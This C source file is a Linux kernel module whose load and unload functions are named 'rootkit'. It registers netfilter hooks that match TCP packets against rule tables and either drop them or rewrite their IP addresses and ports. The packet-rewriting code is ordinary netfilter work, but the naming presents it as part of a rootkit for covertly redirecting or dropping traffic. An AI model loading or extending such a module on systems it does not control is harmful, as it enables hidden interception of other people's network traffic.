#include "rule.h"
#include "packet.h"
#include "packet_modifier.h"

struct nf_hook_params pre_routing_params = {
    .rules = pre_routing_rules,
    .rule_count = ARRAY_SIZE(pre_routing_rules)
};

struct nf_hook_params post_routing_params = {
    .rules = post_routing_rules,
    .rule_count = ARRAY_SIZE(post_routing_rules)
};

struct rule *is_match(struct rule* rules, int rule_count, struct packet *packet) {
    unsigned int i;
    for (i = 0; i < rule_count; i++) {
        struct rule *rule = &rules[i];
        if ((!rule->filter.src.ip || rule->filter.src.ip == packet->ip_header->saddr) &&
            (!rule->filter.src.port || rule->filter.src.port == packet->layer4.tcp_header->source) &&
            (!rule->filter.dst.ip || rule->filter.dst.ip == packet->ip_header->daddr) &&
            (!rule->filter.dst.port || rule->filter.dst.port == packet->layer4.tcp_header->dest)) 
        {
            return rule;
        }
    }
    return NULL;
}

void modify_packet(struct rule *matched_rule, struct packet *packet) {
    if (matched_rule->action.filter.src.ip) {
        packet->ip_header->saddr = matched_rule->action.filter.src.ip;
    }
    if (matched_rule->action.filter.dst.ip) {
        packet->ip_header->daddr = matched_rule->action.filter.dst.ip;
    }
    switch (packet->ip_header->protocol)
    {
        case IPPROTO_TCP:
            if (matched_rule->action.filter.src.port) {
                packet->layer4.tcp_header->source = matched_rule->action.filter.src.port;
            }
            if (matched_rule->action.filter.dst.port) {
                packet->layer4.tcp_header->dest = matched_rule->action.filter.dst.port;
            }
            break;
        default:
            break;
    }
    recalculate_checksum(packet);
}

int handle_packet(struct rule *matched_rule, struct packet *packet) {
    switch (matched_rule->action.action_type)
    {
        case DROP:
            printk(KERN_INFO "Dropping packet destined for \n");
            return NF_DROP;
        case MODIFY:
            printk(KERN_INFO "Changing packet destined for \n");
            modify_packet(matched_rule, packet);
            break;
        default:
            break;
    }
    return NF_ACCEPT;
}

unsigned int filter_packet(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct rule *matched_rule;

    struct nf_hook_params *params = (struct nf_hook_params *)priv;

    struct packet packet = to_packet(skb);

    if (!packet.ip_header || packet.ip_header->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }
    
    matched_rule = is_match(params->rules, params->rule_count, &packet);
    if (matched_rule) {
        print_packet(&packet);
        return handle_packet(matched_rule, &packet);
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops nf_ops[] = {
    {
        .hook = filter_packet,
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_PRE_ROUTING,
        .priority = NF_IP_PRI_NAT_DST,
        .priv = &pre_routing_params
    },
    {
        .hook = filter_packet,
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_POST_ROUTING,
        .priority = NF_IP_PRI_NAT_SRC,
        .priv = &post_routing_params
    }
};

static int __init rootkit_init(void)
{
    print_rules(pre_routing_rules, ARRAY_SIZE(pre_routing_rules));
    print_rules(post_routing_rules, ARRAY_SIZE(post_routing_rules));
    nf_register_net_hooks(&init_net, nf_ops, ARRAY_SIZE(nf_ops));

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    nf_unregister_net_hooks(&init_net, nf_ops, ARRAY_SIZE(nf_ops));

    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);